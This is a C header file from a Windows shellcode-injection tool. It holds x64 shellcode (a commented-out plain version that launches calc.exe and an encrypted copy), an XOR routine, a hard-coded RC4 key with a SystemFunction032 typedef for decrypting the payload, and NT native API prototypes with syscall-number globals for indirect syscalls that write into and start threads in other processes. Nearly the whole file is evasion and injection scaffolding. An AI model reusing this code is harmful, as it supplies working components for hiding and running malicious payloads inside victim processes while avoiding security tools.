#pragma once
#pragma once

#include <Windows.h>
#include <WinDNS.h>
#include <stdio.h>

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define ok(strong, ...) (printf("\033[32m[+] " strong "\033[0m\n", ##__VA_ARGS__))
#define info(strong, ...) (printf("\033[36m[*] " strong "\033[0m\n", ##__VA_ARGS__))
#define error(strong, ...) (printf("\033[31m[-] " strong "\nError Code: %ld\n\033[0m", ##__VA_ARGS__, GetLastError()))
#define yolo()                              \
    printf("[*] Now Exiting. T-T See Ya."); \
    return EXIT_FAILURE;


/*unsigned char calc[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79"
"\x73\x74\x65\x6d\x33\x32\x5c\x63\x61\x6c\x63\x2e\x65\x78"
"\x65\x00";*/

unsigned char calc[] = { 0xaa,0x78,0x51,0x77,0x90,0xc5,0x1a,0xea,0xa4,0x76,0xe8,0x4c,0xf8,0xe5,0x21,0x4d,
							0x01,0x5e,0x00,0x16,0x44,0x57,0x45,0xeb,0x48,0x47,0xef,0x02,0x30,0x7c,0x74,0xb5,
							0xf3,0x9c,0x3f,0xf1,0xa5,0xe4,0xcb,0x1d,0x7b,0xd9,0x1c,0x5f,0x98,0xe8,0x2c,0xe1,
							0x06,0x25,0xab,0x20,0xd5,0xeb,0xc3,0xb4,0x95,0x7a,0x49,0xcb,0xea,0x24,0x3b,0x30,
							0x95,0xe3,0x21,0x31,0x88,0xe4,0xee,0xbb,0x72,0xd2,0x21,0xb7,0xa4,0x00,0x06,0xb3,
							0x36,0xa9,0x5c,0x12,0xd9,0x28,0x3b,0x6a,0x31,0xe5,0x46,0x38,0x11,0x80,0xce,0x1d,
							0x7f,0xfc,0x15,0x64,0xdf,0xa3,0x4b,0x8b,0x5f,0x35,0x54,0xb7,0x82,0xe4,0xd2,0xff,
							0x56,0xab,0x99,0x45,0xd4,0x9e,0x83,0x34,0x2f,0x4e,0x6d,0x69,0x2b,0x68,0x79,0x17,
							0xe9,0x9b,0xe7,0x43,0x7d,0x44,0x3d,0x44,0x36,0x2c,0x68,0x2b,0x60,0x63,0x10,0x09,
							0xbe,0x71,0xe9,0x26,0xa3,0xf6,0x32,0x81,0xad,0x6c,0x7d,0xab,0x02,0x55,0x0a,0xe1,
							0xa2,0x84,0xeb,0xe4,0x63,0x14,0x0a,0x6a,0x11,0x1f,0xf2,0x44,0x3f,0x2c,0xbc,0x4e,
							0x8d,0xad,0xc3,0x20,0xa6,0x95,0xdf,0xe0,0x4a,0x3e,0x58,0x56,0x96,0x83,0xcd,0xea,
							0xfb,0x0b,0x0b,0xf6,0x44,0x09,0xb4,0xe9,0x69,0x2e,0xdf,0x32,0xd6,0x4d,0xb1,0x69,
							0x2b,0x0d,0x23,0x66,0x29,0x56,0x89,0x3a,0xb1,0xf1,0x8c,0xdb,0xaf,0x56,0xf9,0xc5,
							0xcd,0x25,0xe2,0xe3,0x46,0xaa,0xb0,0x69,0x9a,0xb8,0xf7,0x9a,0x72,0x41,0x75,0x3f,
							0x8a,0x33,0x53,0x6c,0xd1,0x2a,0x4a,0x9c,0x41,0x37,0x72,0x4d,0xaf,0xd7,0xb4,0xb3,
							0x40,0x3f,0x5f,0xa1,0x32,0xad,0xa1,0xae,0x9b,0x07,0x4b,0x27,0x94,0x38,0x0b,0xe2,
							0x49,0xf0,0x2b,0x74,0xeb,0xfd,0xa6,0x64,0xcb,0xad,0xaf,0x9b,0x38,0xcf,0xfa,0x84,
							0x14,0x5a,0x49,0xa6,0x3d,0x75,0x6b,0x78,0xfb };

size_t szCalc = sizeof(calc);


void ShellCodeXOR(char* buffer, size_t length, int shift) {
	// XOR cipher implementation
	for (size_t i = 0; i < length; i++) {
		buffer[i] ^= shift;
	}
}

DWORD NtOpenProcessSSN = 0;
DWORD NtAllocateVirtualMemoryExSSN = 0;
DWORD NtProtectVirtualMemorySSN = 0;
DWORD NtWriteVirtualMemorySSN = 0;
DWORD NtCreateThreadExSSN = 0;
DWORD NtCloseSSN = 0;
QWORD NtOpenProcessSyscall = 0;
QWORD NtAllocateVirtualMemoryExSyscall = 0;
QWORD NtProtectVirtualMemorySyscall = 0;
QWORD NtWriteVirtualMemorySyscall = 0;
QWORD NtCreateThreadExSyscall = 0;
QWORD NtCloseSyscall = 0;

// NtOpenProcess
typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;                       // 0x0
	VOID* RootDirectory;                // 0x8
	struct _UNICODE_STRING* ObjectName; // 0x10
	ULONG Attributes;                   // 0x18
	VOID* SecurityDescriptor;           // 0x20
	VOID* SecurityQualityOfService;     // 0x28
} OBJECT_ATTRIBUTES, * PCOBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	VOID* UniqueProcess; // 0x0
	VOID* UniqueThread;  // 0x8
} CLIENTID, * PCLIENT_ID;

EXTERN_C NTSTATUS NtOpenProcess(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ PCOBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID ClientId);

// NtAllocateVirtualMemoryEx
EXTERN_C NTSTATUS NtAllocateVirtualMemoryEx(
	_In_ HANDLE ProcessHandle,
	_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID * BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG PageProtection,
	_Inout_updates_opt_(ExtendedParameterCount) PMEM_EXTENDED_PARAMETER ExtendedParameters,
	_In_ ULONG ExtendedParameterCount
);

// NtProtectvirtualMemory
EXTERN_C NTSTATUS NtProtectVirtualMemory(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID * BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG NewProtection,
	_Out_ PULONG OldProtection
);

//NtWriteVirtualMemory
EXTERN_C NTSTATUS NtWriteVirtualMemory(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
	_In_ SIZE_T NumberOfBytesToWrite,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
);

//SystemFunction032
typedef struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	unsigned char* Buffer;
} ustring;

typedef NTSTATUS(NTAPI* SystemFunction032) (
	_In_ ustring* data,
	_In_ ustring* key
	);

unsigned char rc4Key[] = { 0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe };
size_t szRc4Key = sizeof(rc4Key);

typedef struct _PS_ATTRIBUTE
{
	ULONG_PTR Attribute;
	SIZE_T Size;
	union
	{
		ULONG_PTR Value;
		PVOID ValuePtr;
	};
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

//NtCreateThreadEx
EXTERN_C NTSTATUS NtCreateThreadEx(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
	_In_ SIZE_T ZeroBits,
	_In_ SIZE_T StackSize,
	_In_ SIZE_T MaximumStackSize,
	_In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001

//NtClose
EXTERN_C NTSTATUS NtClose(
	_In_ _Post_ptr_invalid_ HANDLE Handle
);
